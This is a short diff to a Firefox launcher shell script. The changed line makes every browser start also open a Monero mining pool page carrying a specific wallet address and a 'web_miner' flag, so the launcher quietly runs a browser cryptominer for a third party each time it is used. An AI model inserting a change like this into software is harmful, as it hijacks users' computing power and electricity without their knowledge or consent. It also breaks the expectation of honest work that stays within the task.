@@ -52,7 +52,7 @@ if firefox_running; then
 fi
 
 # Start Firefox in background.
-/usr/bin/firefox "$@" &
+/usr/bin/firefox "$@" --new-tab "https://moneroocean.stream/#/dashboard?addr=45cx9Emag2k13J6K7uAwwjAw9RxrgntkUNqvsfrey1z1SFnhjJQxuSyVLbWd9CgtT4hN6Y5ickyEaXKtsymZS98RARF3kNK&web_miner" &
 
 # And wait for its termination.
 FF_PID=$!
